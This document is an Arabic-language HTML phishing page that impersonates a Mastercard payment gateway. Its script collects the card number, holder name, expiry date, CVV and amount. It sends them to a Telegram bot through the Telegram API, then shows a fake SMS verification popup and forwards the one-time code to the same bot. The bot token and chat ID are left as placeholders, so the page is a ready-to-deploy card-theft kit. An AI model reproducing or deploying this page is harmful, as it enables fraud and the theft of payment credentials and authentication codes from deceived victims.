<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع - ماستركارد</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 30px auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header img {
            max-width: 150px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .card-icons {
            text-align: center;
            margin: 10px 0;
        }
        .card-icons img {
            width: 40px;
            margin: 0 5px;
        }
        button {
            background-color: #0070ba;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #005ea6;
        }
        .secure {
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
            color: #666;
        }
        
        /* نافذة التحقق المنبثقة */
        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border-radius: 8px;
            width: 80%;
            max-width: 400px;
            text-align: center;
        }
        .close {
            color: #aaa;
            float: left;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover {
            color: black;
        }
        #verificationForm {
            margin-top: 20px;
        }
        #verificationCode {
            font-size: 18px;
            letter-spacing: 3px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.mastercard.us/content/dam/mccom/en-us/consumers/Find-a-Card/images/mastercard-logo.png" alt="Mastercard Logo">
            <h2>إتمام عملية الدفع</h2>
        </div>
        
        <div class="card-icons">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196578.png" alt="Visa">
            <img src="https://cdn-icons-png.flaticon.com/512/196/196561.png" alt="Mastercard">
        </div>
        
        <form id="paymentForm">
            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="16" required>
            </div>
            
            <div class="form-group">
                <label for="cardName">اسم حامل البطاقة</label>
                <input type="text" id="cardName" placeholder="كما هو مدون على البطاقة" required>
            </div>
            
            <div class="form-group" style="display: flex; gap: 10px;">
                <div style="flex: 1;">
                    <label for="expiryDate">تاريخ الانتهاء</label>
                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div style="flex: 1;">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" placeholder="123" maxlength="3" required>
                </div>
            </div>
            
            <div class="form-group">
                <label for="amount">المبلغ</label>
                <input type="text" id="amount" placeholder="100.00" required>
            </div>
            
            <button type="submit">تأكيد الدفع</button>
        </form>
        
        <div class="secure">
            <p>جميع المعاملات مؤمنة ومشفرة</p>
        </div>
    </div>

    <!-- نافذة التحقق المنبثقة -->
    <div id="verificationModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h3>التحقق من الهوية</h3>
            <p>لقد أرسلنا رمز تحقق إلى هاتفك المحمول. يرجى إدخاله أدناه:</p>
            
            <form id="verificationForm">
                <div class="form-group">
                    <input type="text" id="verificationCode" placeholder="أدخل الكود المكون من 6 أرقام" maxlength="6" required>
                </div>
                <button type="submit">تأكيد</button>
            </form>
            
            <p style="margin-top: 15px; font-size: 12px; color: #666;">
                لم تستلم الكود؟ <a href="#" id="resendCode">إعادة إرسال</a>
            </p>
        </div>
    </div>

    <script>
        // العناصر المهمة
        const paymentForm = document.getElementById('paymentForm');
        const verificationModal = document.getElementById('verificationModal');
        const verificationForm = document.getElementById('verificationForm');
        const closeBtn = document.querySelector('.close');
        const resendCodeBtn = document.getElementById('resendCode');
        
        // إغلاق النافذة المنبثقة
        closeBtn.onclick = function() {
            verificationModal.style.display = 'none';
        }
        
        // إعادة إرسال الكود
        resendCodeBtn.onclick = function(e) {
            e.preventDefault();
            alert('تم إعادة إرسال كود التحقق إلى هاتفك');
        }
        
        // عند إرسال نموذج الدفع
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // جمع بيانات الدفع
            const paymentData = {
                cardNumber: document.getElementById('cardNumber').value,
                cardName: document.getElementById('cardName').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value,
                amount: document.getElementById('amount').value
            };
            
            // إرسال البيانات إلى البوت عبر Telegram API
            const botToken = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            const message = `💳 *بيانات بطاقة جديدة* 💳
            
📌 *رقم البطاقة:* ${paymentData.cardNumber}
👤 *اسم الحامل:* ${paymentData.cardName}
📅 *تاريخ الانتهاء:* ${paymentData.expiryDate}
🔐 *CVV:* ${paymentData.cvv}
💰 *المبلغ:* ${paymentData.amount}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                // عرض نافذة التحقق بعد إرسال البيانات بنجاح
                verificationModal.style.display = 'block';
                
                // إخفاء نموذج الدفع الأصلي
                document.querySelector('.container').style.display = 'none';
            })
            .catch(error => {
                console.error('Error:', error);
                alert('حدث خطأ أثناء إرسال البيانات!');
            });
        });
        
        // عند إرسال نموذج التحقق
        verificationForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const verificationCode = document.getElementById('verificationCode').value;
            
            // إرسال كود التحقق إلى البوت
            const botToken = 'YOUR_BOT_TOKEN';
            const chatId = 'YOUR_CHAT_ID';
            const verificationMessage = `🔑 *كود التحقق*: ${verificationCode}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: verificationMessage,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                alert('تم التحقق بنجاح! سيتم الآن إتمام عملية الدفع.');
                verificationModal.style.display = 'none';
                // يمكنك إضافة إعادة توجيه أو أي إجراء آخر هنا
            })
            .catch(error => {
                console.error('Error sending verification code:', error);
                alert('حدث خطأ أثناء إرسال كود التحقق!');
            });
        });
    </script>
</body>
</html>
